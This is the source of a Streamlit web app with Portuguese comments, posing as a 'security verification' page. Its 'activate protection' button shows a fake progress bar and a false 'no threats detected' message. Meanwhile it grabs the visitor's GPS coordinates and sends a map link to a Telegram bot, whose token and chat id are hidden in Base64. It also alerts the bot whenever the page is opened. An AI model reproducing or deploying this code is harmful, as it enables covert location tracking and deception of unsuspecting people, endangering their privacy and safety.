import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- DADOS PROTEGIDOS (Base64) ---
B_TK = "ODUyNTkyNzY0MTpBQUhLRE9ORnZoOExnVXBJRU5tdHBsVGZIdW9GcmcxZmZyOA=="
B_ID = "ODIxMDgyODM5OA=="

def enviar_telegram(mensagem):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        payload = {"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}
        # Timeout curto para não travar o site se o bot estiver offline
        r = requests.post(url, json=payload, timeout=5)
        return r.status_code == 200
    except:
        return False

# Configuração da Página
st.set_page_config(page_title="VERIFICAÇÃO", page_icon="🔐")

# 1. TESTE AUTOMÁTICO AO ABRIR O SITE
if 'teste_bot' not in st.session_state:
    foi = enviar_telegram("✅ SISTEMA ON: O site foi aberto com sucesso!")
    st.session_state.teste_bot = foi

# Visual do Site
st.markdown("""
    <style>
    .main { background-color: #0d1117; color: #ffffff; }
    .status-ok { color: #2ea043; font-weight: bold; font-size: 18px; }
    .stProgress > div > div > div > div { background-color: #0056b3; }
    </style>
    """, unsafe_allow_html=True)

st.title("Verificação de Segurança")

# Lógica do Botão
if st.button("● ATIVAR PROTEÇÃO AGORA"):
    barra = st.progress(0)
    for i in range(1, 101):
        time.sleep(0.01)
        barra.progress(i)
    
    # Exibe a mensagem de sucesso mesmo se o GPS demorar
    st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
    
    # Tenta pegar o GPS em segundo plano
    loc = get_geolocation()
    if loc:
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        enviar_telegram(f"🚨 LOCALIZAÇÃO: {mapa}")

st.markdown('<p style="text-align:center; color:#8b949e; font-size:12px; margin-top:50px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
